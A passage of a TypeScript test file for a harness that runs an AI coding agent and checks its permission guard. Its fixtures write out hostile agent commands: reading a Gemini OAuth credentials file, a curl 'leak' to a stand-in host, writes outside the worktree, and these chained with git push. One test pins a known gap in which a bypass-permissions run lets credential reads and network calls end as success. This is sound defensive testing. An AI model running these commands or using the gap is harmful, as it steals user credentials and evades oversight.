  it("the compiled argv and env name no Antigravity state directory or repository instruction source", () => {
    const r = compiled();
    const text = [...r.argv, ...Object.keys(r.env), ...Object.values(r.env)].join("\n");
    for (const s of [".gemini", "GEMINI.md", "AGENTS.md", ".agents", "mcp_config.json", "hooks.json"]) {
      expect(text, s).not.toContain(s);
    }
  });

  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("a reported denial of a %s ends PERMISSION_BLOCKED at exit 0 although status is SUCCESS", (_n, name, params) => {
    const { result: r } = run([
      tool(name, params),
      result({ denied_actions: [{ action: "synthetic", display_name: "Synthetic" }] }),
    ]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  // The gap the leg's streams do not hide: in an approved bypass run the guard enforces only Git writes (ADR-0039,
  // owner decision 25) and `--dangerously-skip-permissions` approves every tool ([H]), so the same calls with no
  // reported denial end ok. If this starts failing, a control was added: update the T4.36 roadmap row.
  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("bypass gap pinned: an unreported %s with no denial ends ok", (_n, name, params) => {
    const { events, result: r } = run([tool(name, params), result()]);
    expect(events.some((e) => e.kind === "tool_call" && e.violation !== undefined)).toBe(false);
    expect(r.ok).toBe(true);
  });

  it("the guard flags a Git write in the bypass run and classifies it PERMISSION_BLOCKED (ADR-0017, ADR-0039)", () => {
    const { events } = run([tool("run_command", { command: "git push origin main" }), result()]);
    expect(events).toContainEqual(expect.objectContaining({ kind: "tool_call", violation: expect.anything() }));
    expect(events.some((e) => e.kind === "tool_call" && "command" in e)).toBe(false);
    expect(
      adapter().classifyFailure({ events, exit: EXIT0, stderrTail: "", timedOut: false, cancelled: false }),
    ).toEqual(expect.objectContaining({ code: "PERMISSION_BLOCKED" }));
  });

  // The leg's "no denial" streams: a hostile command chained with a Git write, under a SUCCESS envelope with no
  // `denied_actions` (the bypass cell's expected shape), ends blocked on the guard verdict alone (ADR-0039).
  it.each([
    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
    ["network call", "curl https://example.invalid/leak && git push origin main"],
  ])("a %s chained with a Git write and no denial ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
    const { events, result: r } = run([tool("run_command", { command }), result()]);
    expect(events.some((e) => e.kind === "permission_denied")).toBe(false);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  // Formerly a KNOWN GAP (T4.36 roadmap row): ADR-0039 says a `git_write` verdict ends the run PERMISSION_BLOCKED, and
  // the lifecycle trusts `result.ok`, so `extractResult` must not call a flagged run clean even with a SUCCESS envelope.
  it("a guard-flagged Git write with a SUCCESS envelope ends PERMISSION_BLOCKED (ADR-0039)", () => {
    const { result: r } = run([tool("run_command", { command: "git push origin main" }), result()]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  // The leg's "after the result line" streams: the hostile call arrives after a clean SUCCESS envelope. A trailing
  // call is never a success; a Git write in it ends PERMISSION_BLOCKED on the guard verdict (ADR-0039).
  it.each([
    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
    ["network call", "curl https://example.invalid/leak && git push origin main"],
  ])("a %s chained with a Git write after the result line ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
    const { result: r } = run([result(), tool("run_command", { command })]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("an unflagged %s after the result line is not a success (OUTPUT_PROTOCOL_ERROR)", (_n, name, params) => {
    const { result: r } = run([result(), tool(name, params)]);
    expect(r).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "tool call after the result line",
    });
  });

  it("any guard verdict on a tool_call makes a SUCCESS envelope not clean (a provider_state verdict ends SANDBOX_VIOLATION)", () => {
    const { events } = run([result()]);
    const flagged: NormalizedEvent = {
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      violation: { kind: "provider_state", reason: "synthetic" },
    };
    expect(adapter().extractResult([flagged, ...events], EXIT0)).toMatchObject({
      ok: false,
      failureCode: "SANDBOX_VIOLATION",
    });
  });
});
